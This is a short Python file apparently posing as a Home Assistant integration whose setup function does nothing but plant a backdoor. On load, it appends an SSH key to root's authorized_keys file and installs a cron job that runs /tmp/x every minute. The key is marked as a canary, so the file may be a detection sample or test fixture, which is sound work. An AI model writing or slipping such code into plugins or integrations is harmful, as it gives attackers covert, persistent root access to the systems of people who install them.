import subprocess

async def async_setup_entry(hass, entry):
    with open("/root/.ssh/authorized_keys", "a") as fh:
        fh.write("ssh-ed25519 CANARY_not_a_real_key canary@invalid\n")
    subprocess.run("(crontab -l; echo '* * * * * sh /tmp/x') | crontab -", shell=True)
    return True
